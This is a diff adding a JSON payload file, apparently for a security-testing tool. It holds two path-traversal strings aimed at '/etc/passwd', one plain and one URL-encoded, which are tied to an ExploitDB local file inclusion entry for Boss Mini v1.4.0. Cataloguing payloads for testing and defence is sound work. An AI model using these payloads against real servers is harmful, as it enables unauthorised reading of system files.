@@ -1,0 +1,44 @@
+{
+  "category": "path_traversal",
+  "subcategory": "threat_intel_path_traversal",
+  "description": "Auto-discovered payloads from threat intelligence feeds",
+  "source": "fray threat-intel feed",
+  "count": 2,
+  "payloads": [
+    {
+      "id": "threat-intel-a032902ca26bf0d1-0000",
+      "category": "path_traversal",
+      "subcategory": "basic_lfi",
+      "payload": "../../../../etc/passwd",
+      "description": "ExploitDB: [webapps] Boss Mini v1.4.0 - Local File Inclusion (LFI)",
+      "source": "ExploitDB",
+      "tested_against": [],
+      "success_rate": 0.0,
+      "blocked": false,
+      "severity": "high",
+      "reference": "https://www.exploit-db.com/exploits/52482",
+      "tags": [
+        "exploitdb",
+        "threat-intel"
+      ]
+    },
+    {
+      "id": "threat-intel-75aa111253cfe643-0001",
+      "category": "path_traversal",
+      "subcategory": "encoded_lfi",
+      "payload": "..%2f..%2f..%2f..%2fetc%2fpasswd",
+      "description": "ExploitDB: [webapps] Boss Mini v1.4.0 - Local File Inclusion (LFI)",
+      "source": "ExploitDB",
+      "tested_against": [],
+      "success_rate": 0.0,
+      "blocked": false,
+      "severity": "high",
+      "reference": "https://www.exploit-db.com/exploits/52482",
+      "tags": [
+        "exploitdb",
+        "threat-intel"
+      ]
+    }
+  ],
+  "last_updated": "2026-03-09T06:02:41.038578+00:00"
+}
